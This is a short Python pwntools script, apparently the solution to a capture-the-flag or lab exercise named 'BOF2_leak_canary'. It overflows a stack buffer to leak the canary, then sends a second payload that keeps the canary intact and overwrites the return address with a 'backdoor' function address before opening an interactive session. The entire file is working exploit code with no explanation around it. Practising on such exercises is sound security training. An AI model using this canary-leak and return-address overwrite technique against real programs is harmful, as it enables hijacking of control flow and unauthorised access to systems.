from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

backdoor = 0x00000000004011b6 + 5

r = process('./BOF2_leak_canary')

r.sendlineafter(b': ', b'a' * 0x28)

r.recvline()

canary = r.recv(7).rjust(8, b'\0')

r.sendlineafter(b': ', b'a' * 0x18 + canary + b'a' * 8 + p64(backdoor))

r.interactive()
